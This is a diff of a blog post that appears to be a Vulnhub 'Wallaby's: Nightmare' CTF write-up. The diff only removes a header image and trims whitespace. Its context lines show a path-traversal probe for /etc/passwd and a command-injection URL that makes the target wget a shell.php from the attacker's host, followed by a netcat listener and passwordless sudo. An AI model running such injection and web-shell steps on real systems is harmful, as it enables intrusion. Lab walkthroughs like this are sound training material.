@@ -4,7 +4,6 @@ title:      "Vulnhub.com - Wallaby's: Nightmare"
 subtitle:   "Write-Up"
 date:       2017-07-16 8:00:00
 author:     "W3ndige"
-header-img: "img/wallabys-nightmare-header.jpeg"
 permalink: /:title/
 category: Vulnhub
 ---
@@ -221,7 +220,7 @@ root@kali:~# nikto -h 192.168.56.101:60080
 + No CGI Directories found (use '-C all' to force check all possible dirs)
 + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
 + /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
-+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
 + OSVDB-3233: /icons/README: Apache default file found.
 + 7537 requests: 0 error(s) and 7 item(s) reported on remote host
 + End Time:           2017-07-15 08:29:23 (GMT-4) (27 seconds)
@@ -264,7 +263,7 @@ GENERATED WORDS: 20458
 + http://192.168.56.101:60080/?page=home (CODE:200|SIZE:1145)                  
 + http://192.168.56.101:60080/?page=index (CODE:200|SIZE:1360)                 
 + http://192.168.56.101:60080/?page=mailer (CODE:200|SIZE:1083)                
-                                                                               
+
 -----------------
 END_TIME: Sat Jul 15 08:37:24 2017
 DOWNLOADED: 20458 - FOUND: 6
@@ -332,7 +331,7 @@ Serving HTTP on 0.0.0.0 port 8000 ...
 http://192.168.56.101:60080/?page=mailer&mail=wget%20192.168.56.102:8000/shell.php
 http://192.168.56.101:60080/?page=mailer&mail=ls
 
-eye.jpg index.php s13!34g$3FVA5e@ed sec.png shell.php uname.txt 
+eye.jpg index.php s13!34g$3FVA5e@ed sec.png shell.php uname.txt
 {% endhighlight %}
 
 <p>Now start the netcat listener and navigate to the shell.php file. </p>
@@ -474,7 +473,7 @@ Matching Defaults entries for wallaby on ubuntu:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User wallaby may run the following commands on ubuntu:
-    (ALL) NOPASSWD: ALL 
+    (ALL) NOPASSWD: ALL
 {% endhighlight %}
 
 <p>In addition we can freely use sudo. Amazing! </p>
@@ -531,4 +530,3 @@ Thanks guys!
 {% endhighlight %}
 
 <p>Here we have the final flag, and the game is over. It was anothers great and educational machine from <a href="https://www.vulnhub.com">Vulnhub</a>. Thanks <a href="https://www.arashparsa.com/">Waldo</a>!</p>
-
